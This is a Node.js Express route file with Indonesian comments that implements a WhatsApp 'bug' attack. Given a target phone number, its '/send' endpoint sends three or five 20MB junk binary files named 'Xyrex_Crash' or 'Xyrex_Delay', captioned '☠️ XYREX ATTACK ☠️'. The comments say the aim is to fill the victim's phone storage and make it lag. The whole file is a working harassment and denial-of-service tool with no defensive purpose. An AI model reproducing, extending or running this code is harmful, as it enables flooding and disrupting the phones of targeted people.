const express = require('express');
const router = express.Router();
const pairingRouter = require('./pairing');
const fs = require('fs');
const path = require('path');

router.post('/send', async (req, res) => {
  try {
    let { target, type } = req.body;
    if (!target || !type) return res.status(400).json({ ok: false, msg: 'Missing fields' });

    const sock = pairingRouter.getSock();
    if (!sock) return res.status(400).json({ ok: false, msg: 'WhatsApp belum di-pairing.' });

    let cleanTarget = target.replace(/[^0-9]/g, '');
    if (cleanTarget.startsWith('0')) cleanTarget = '62' + cleanTarget.slice(1);
    
    const [result] = await sock.onWhatsApp(cleanTarget);
    if (!result || !result.exists) {
      return res.status(400).json({ ok: false, msg: 'Nomor target tidak terdaftar di WhatsApp.' });
    }

    const jid = result.jid;
    let sent = 0;

    // Siapkan folder dan file sampah
    const dataDir = path.join(__dirname, '..', 'data');
    if (!fs.existsSync(dataDir)) fs.mkdirSync(dataDir, { recursive: true });
    const tempFilePath = path.join(dataDir, 'bug_file.bin');

    // Buat file 20MB (Cukup untuk bikin storage target penuh tanpa bikin Termux jebol)
    if (!fs.existsSync(tempFilePath)) {
      const stream = fs.createWriteStream(tempFilePath);
      const chunk = Buffer.alloc(1024 * 1024); // 1MB
      for (let i = 0; i < 20; i++) stream.write(chunk); // Tulis 20MB
      stream.end();
    }
    // Tunggu file selesai dibuat
    await new Promise(r => setTimeout(r, 1000));
    const fileBuffer = fs.readFileSync(tempFilePath);

    // Payload teks di dalam file
    const captionText = '☠️ XYREX ATTACK ☠️\n\nFile ini berisi data rusak yang dibuat khusus untuk membuat sistem HP kamu penuh dan nge-lag.';

    if (type === 'foreclose' || type === 'crash' || type === 'crashios') {
      // Kirim 3 kali file 20MB
      for (let i = 0; i < 3; i++) {
        await sock.sendMessage(jid, { 
          document: fileBuffer, 
          mimetype: 'application/octet-stream', 
          fileName: `Xyrex_Crash_${i}_20MB.bin`,
          caption: captionText
        }).catch(() => {});
        sent++;
        await new Promise(r => setTimeout(r, 3000)); // Jeda 3 detik
      }
    } 
    else if (type === 'delay') {
      // Kirim 5 kali file 20MB
      for (let i = 0; i < 5; i++) {
        await sock.sendMessage(jid, { 
          document: fileBuffer, 
          mimetype: 'application/octet-stream', 
          fileName: `Xyrex_Delay_${i}_20MB.bin`,
          caption: captionText
        }).catch(() => {});
        sent++;
        await new Promise(r => setTimeout(r, 2000)); // Jeda 2 detik
      }
    }

    // Hapus file dari server setelah selesai
    setTimeout(() => { try { fs.unlinkSync(tempFilePath); } catch(e){} }, 5000);

    res.json({ ok: true, msg: `Berhasil mengirim file ke ${cleanTarget}`, packetsSent: sent });
  } catch (e) { res.status(500).json({ ok: false, msg: e.message }); }
});

module.exports = router;
